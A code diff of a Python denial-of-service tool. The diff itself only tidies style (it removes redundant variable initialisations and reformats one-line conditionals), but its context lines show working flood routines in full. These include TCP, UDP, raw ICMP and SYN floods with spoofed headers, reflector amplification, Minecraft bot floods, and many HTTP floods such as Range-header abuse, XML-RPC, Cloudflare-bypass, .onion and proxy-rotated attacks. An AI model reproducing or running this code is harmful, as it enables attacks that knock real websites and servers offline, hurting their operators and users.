@@ -289,7 +289,6 @@ class Tools:
 
     @staticmethod
     def dgb_solver(url, ua, pro=None):
-        s = None
         idss = None
         with Session() as s:
             if pro:
@@ -478,7 +477,8 @@ class Layer4(Thread):
         }
 
     def run(self) -> None:
-        if self._synevent: self._synevent.wait()
+        if self._synevent:
+            self._synevent.wait()
         self.select(self._method)
         while self._synevent.is_set():
             self.SENT_FLOOD()
@@ -498,7 +498,6 @@ class Layer4(Thread):
         return s
 
     def TCP(self) -> None:
-        s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             while Tools.send(s, randbytes(1024)):
                 continue
@@ -508,7 +507,6 @@ class Layer4(Thread):
         handshake = Minecraft.handshake(self._target, self.protocolid, 1)
         ping = Minecraft.data(b'\x00')
 
-        s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             while Tools.send(s, handshake):
                 Tools.send(s, ping)
@@ -516,13 +514,11 @@ class Layer4(Thread):
 
     def CPS(self) -> None:
         global REQUESTS_SENT
-        s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             REQUESTS_SENT += 1
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
-        s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             while s.recv(1):
                 continue
@@ -535,7 +531,6 @@ class Layer4(Thread):
             REQUESTS_SENT += 1
 
     def UDP(self) -> None:
-        s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
             while Tools.sendto(s, randbytes(1024), self._target):
                 continue
@@ -551,7 +546,6 @@ class Layer4(Thread):
 
     def ICMP(self) -> None:
         payload = self._genrate_icmp()
-        s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, payload, self._target):
@@ -559,7 +553,6 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def SYN(self) -> None:
-        s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, self._genrate_syn(), self._target):
@@ -567,7 +560,6 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def AMP(self) -> None:
-        s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, *next(self._amp_payloads)):
@@ -575,8 +567,6 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def MCBOT(self) -> None:
-        s = None
-
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         self.protocolid,
@@ -910,7 +900,8 @@ class HttpFlood(Thread):
                 self.SENT_FLOOD = value
                 
     def run(self) -> None:
-        if self._synevent: self._synevent.wait()
+        if self._synevent:
+            self._synevent.wait()
         self.select(self._method)
         while self._synevent.is_set():
             self.SENT_FLOOD()
@@ -971,7 +962,6 @@ class HttpFlood(Thread):
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
-        s = None
         with  suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -984,7 +974,6 @@ class HttpFlood(Thread):
                                   f"Host: {target}\r\n" +
                                   self.randHeadercontent +
                                   "\r\n")
-        s = None
         target = self._target.host.replace(".onion", provider), self._raw_target[1]
         with suppress(Exception), self.open_connection(target) as s:
             for _ in range(self._rpc):
@@ -997,7 +986,6 @@ class HttpFlood(Thread):
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1009,9 +997,8 @@ class HttpFlood(Thread):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+             (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1021,7 +1008,6 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload(
             "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                             for i in range(1, 1024)))
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1037,9 +1023,8 @@ class HttpFlood(Thread):
              "<params><param><value><string>%s</string></value>"
              "</param><param><value><string>%s</string>"
              "</value></param></params></methodCall>") %
-            (ProxyTools.Random.rand_str(64),
+             (ProxyTools.Random.rand_str(64),
              ProxyTools.Random.rand_str(64)))[:-2]
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1048,7 +1033,6 @@ class HttpFlood(Thread):
     def PPS(self) -> None:
         payload: Any = str.encode(self._defaultpayload +
                                   f"Host: {self._target.authority}\r\n\r\n")
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1060,7 +1044,6 @@ class HttpFlood(Thread):
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1085,7 +1068,6 @@ class HttpFlood(Thread):
             "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                           ProxyTools.Random.rand_str(4)) +
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
-        s = None
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, p1)
             Tools.send(s, p2)
@@ -1095,7 +1077,6 @@ class HttpFlood(Thread):
 
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
-        s = None
         with suppress(Exception), self.open_connection() as s:
             while Tools.send(s, payload) and s.recv(1):
                 continue
@@ -1103,7 +1084,6 @@ class HttpFlood(Thread):
 
     def OVH(self) -> None:
         payload: bytes = self.generate_payload()
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
                 Tools.send(s, payload)
@@ -1114,7 +1094,6 @@ class HttpFlood(Thread):
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
-        s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
                 if pro:
@@ -1131,19 +1110,18 @@ class HttpFlood(Thread):
 
     def CFBUAM(self):
         payload: bytes = self.generate_payload()
-        s = None
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
             sleep(5.01)
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
-                if time() > ts + 120: break
+                if time() > ts + 120:
+                    break
         Tools.safe_close(s)
 
     def AVB(self):
         payload: bytes = self.generate_payload()
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
@@ -1180,7 +1158,6 @@ class HttpFlood(Thread):
                                   f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                   self.randHeadercontent +
                                   "\r\n")
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1189,7 +1166,6 @@ class HttpFlood(Thread):
     def DOWNLOADER(self):
         payload: Any = self.generate_payload()
 
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1206,7 +1182,6 @@ class HttpFlood(Thread):
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
-        s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
                 if pro:
@@ -1222,7 +1197,6 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def GSB(self):
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
@@ -1262,7 +1236,6 @@ class HttpFlood(Thread):
                              'Sec-Gpc: 1\r\n'
                              'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1300,7 +1273,6 @@ class HttpFlood(Thread):
                                                           self._target.authority) +
             "Host: %s\r\n" % hexh +
             self.randHeadercontent + dep)
-        s = None
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, p1)
             for _ in range(self._rpc):
@@ -1313,7 +1285,6 @@ class HttpFlood(Thread):
                                   "User-Agent: null\r\n" +
                                   "Referrer: null\r\n" +
                                   self.SpoofIP + "\r\n")
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1348,7 +1319,6 @@ class HttpFlood(Thread):
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
-        s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -1420,7 +1390,8 @@ class ToolsConsole:
 
         while 1:
             cmd = input(cons + " ").strip()
-            if not cmd: continue
+            if not cmd:
+                continue
             if " " in cmd:
                 cmd, args = cmd.split(" ", 1)
 
@@ -1476,14 +1447,17 @@ class ToolsConsole:
                 while True:
                     with suppress(Exception):
                         domain = input(f'{cons}give-me-ipaddress# ')
-                        if not domain: continue
-                        if domain.upper() == "BACK": break
+                        if not domain:
+                            continue
+                        if domain.upper() == "BACK":
+                            break
                         if domain.upper() == "CLEAR":
                             print("\033c")
                             continue
                         if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
                             exit(-1)
-                        if "/" not in domain: continue
+                        if "/" not in domain:
+                            continue
                         logger.info("please wait ...")
 
                         with get(domain, timeout=20) as r:
@@ -1495,8 +1469,10 @@ class ToolsConsole:
             if cmd == "INFO":
                 while True:
                     domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
+                    if not domain:
+                        continue
+                    if domain.upper() == "BACK":
+                        break
                     if domain.upper() == "CLEAR":
                         print("\033c")
                         continue
@@ -1504,7 +1480,8 @@ class ToolsConsole:
                         exit(-1)
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
+                    if "/" in domain:
+                        domain = domain.split("/")[0]
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.info(domain)
@@ -1524,8 +1501,10 @@ class ToolsConsole:
             if cmd == "TSSRV":
                 while True:
                     domain = input(f'{cons}give-me-domain# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
+                    if not domain:
+                        continue
+                    if domain.upper() == "BACK":
+                        break
                     if domain.upper() == "CLEAR":
                         print("\033c")
                         continue
@@ -1533,7 +1512,8 @@ class ToolsConsole:
                         exit(-1)
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
+                    if "/" in domain:
+                        domain = domain.split("/")[0]
                     print('please wait ...', end="\r")
 
                     info = ToolsConsole.ts_srv(domain)
@@ -1543,8 +1523,10 @@ class ToolsConsole:
             if cmd == "PING":
                 while True:
                     domain = input(f'{cons}give-me-ipaddress# ')
-                    if not domain: continue
-                    if domain.upper() == "BACK": break
+                    if not domain:
+                        continue
+                    if domain.upper() == "BACK":
+                        break
                     if domain.upper() == "CLEAR":
                         print("\033c")
                     if {domain.upper()} & {"E", "EXIT", "Q", "QUIT", "LOGOUT", "CLOSE"}:
@@ -1552,7 +1534,8 @@ class ToolsConsole:
 
                     domain = domain.replace('https://',
                                             '').replace('http://', '')
-                    if "/" in domain: domain = domain.split("/")[0]
+                    if "/" in domain:
+                        domain = domain.split("/")[0]
 
                     logger.info("please wait ...")
                     r = ping(domain, count=5, interval=0.2)
@@ -1623,7 +1606,7 @@ class ToolsConsole:
                 for srv in srv_records:
                     Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                         srv.port)
-            except:
+            except Exception:
                 Info[rec] = 'Not found'
 
         return Info
@@ -1746,8 +1729,10 @@ if __name__ == '__main__':
                 referers = set(a.strip()
                                for a in referers_li.open("r+").readlines())
 
-                if not uagents: exit("Empty Useragent File ")
-                if not referers: exit("Empty Referer File ")
+                if not uagents:
+                    exit("Empty Useragent File ")
+                if not referers:
+                    exit("Empty Referer File ")
 
                 if threads > 1000:
                     logger.warning("Thread is higher than 1000")
@@ -1805,7 +1790,8 @@ if __name__ == '__main__':
                                 logger.setLevel("DEBUG")
                             ref = set(a.strip()
                                       for a in Tools.IP.findall(refl_li.open("r").read()))
-                            if not ref: exit("Empty Reflector File ")
+                            if not ref:
+                                exit("Empty Reflector File ")
 
                         elif argfive.isdigit() and len(argv) >= 7:
                             if len(argv) == 8:
